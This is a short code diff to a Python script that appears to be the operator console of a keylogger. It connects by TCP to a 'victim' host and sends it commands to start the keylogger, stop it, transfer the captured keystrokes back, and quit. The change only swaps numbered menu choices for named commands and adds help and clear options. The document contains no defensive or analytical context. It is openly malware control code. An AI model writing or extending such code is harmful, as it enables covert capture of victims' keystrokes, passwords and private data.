@@ -14,19 +14,23 @@ victim_address = (args.ip, args.port)
 
 sock = socket(AF_INET, SOCK_STREAM)
 sock.connect(victim_address)
+printMenu()
 while True:
-    system("clear")
-    printMenu()
     try:
-        msg = input("Enter a command: ")
-        if msg == "1":
+        msg = input("$ ")
+        if msg == HELP:
+            printHelp()
+        elif msg == CLEAR:
+            system("clear")
+        elif msg == START_KEYLOGGER:
             sock.sendall(START_KEYLOGGER.encode("utf-8"))
-        elif msg == "2":
+        elif msg == STOP_KEYLOGGER:
             sock.sendall(STOP_KEYLOGGER.encode("utf-8"))
-        elif msg == "3":
+        elif msg == TRANSFER_KEYLOGGER:
             sock.sendall(TRANSFER_KEYLOGGER.encode("utf-8"))
-        elif msg == "4":
+        elif msg == QUIT:
             sock.sendall(QUIT.encode("utf-8"))
+            print("Quitting...")
             break
         else:
             print("Unrecognized Command!")
